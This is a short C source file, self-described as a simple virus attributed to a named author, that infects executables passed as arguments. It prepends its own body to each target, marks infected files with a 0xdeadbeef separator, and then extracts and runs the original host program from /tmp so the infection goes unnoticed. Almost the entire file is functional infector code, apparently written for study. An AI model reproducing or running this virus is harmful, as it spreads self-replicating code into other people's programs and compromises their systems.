/* Simple virus that hides in the executable of another program.
   Written by Thomas Ingram <taingram@mtu.edu> */

// POSIX standard needed for fileno() and fchomd()
#define _POSIX_C_SOURCE 199309L

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include "vhlpr.h"

int main(int argc, char* argv[])
{
#ifdef DEBUG
  fprintf(stderr, "debug: Debug mode is on\n");
#endif

  FILE* this_file = fopen(argv[0], "r");
  check_file(this_file, argv[0]);
  int sep[] = {0xde, 0xad, 0xbe, 0xef};
  long host_offset = seek_to_sep(this_file, sep);
  if (host_offset < 0) {
    fclose(this_file);
    return EXIT_FAILURE;
  }

  char* host_tmp_str = gen_unique_filename("/tmp/host");
  FILE* host_tmp = fopen(host_tmp_str, "w");
  check_file(host_tmp, host_tmp_str);

  // Write host section to temporary file
  copy_file(this_file, host_tmp, host_offset, 0);
  // Set permissions and execution bit
  fchmod(fileno(host_tmp), S_IRUSR|S_IWUSR|S_IXUSR);
  fclose(host_tmp);

  if (argc > 1) { // Check for input files we can infect

    // Temporary victim file
    char* victim_tmp_str = gen_unique_filename("/tmp/victim");
    FILE* victim_tmp = fopen(victim_tmp_str, "w+");
    check_file(victim_tmp, victim_tmp_str);

    for (int i = 1; i < argc; i++) {
      fseek(victim_tmp, 0, SEEK_SET); // Reset offset

      // Check file exists, read/write, and execution bit is NOT set
      if (access(argv[i], F_OK | R_OK | W_OK) &&
	  !access(argv[i], X_OK)) {
	continue;
      }

      FILE* victim = fopen(argv[i], "r+");
      if (victim == NULL) {
#ifdef DEBUG
	perror(argv[i]);
#endif
	continue; // fail gracefully, move to next arg
      }

      // Check if file is already infected
      long vic_offset = seek_to_sep(victim, sep);
      if (vic_offset == host_offset) {
	continue;
      }

      // Write virus to temporary victim file
      copy_file(this_file, victim_tmp, 0, host_offset);

      // Write victim to temporary victim file
      copy_file(victim, victim_tmp, 0, 0);

      // Copy temporary victim to original
      fseek(victim, 0, SEEK_SET);
      copy_file(victim_tmp, victim, 0, 0);

      fclose(victim);
    }

    /* remove(victim_tmp_str); */
    free(victim_tmp_str);
    fclose(victim_tmp);
  }

  // Run host with args
  pid_t cid = fork();
  if (!cid) {
    execv(host_tmp_str, argv);
    return EXIT_FAILURE;
  }
  wait(NULL);

  remove(host_tmp_str);
  free(host_tmp_str);

  return EXIT_SUCCESS;
}
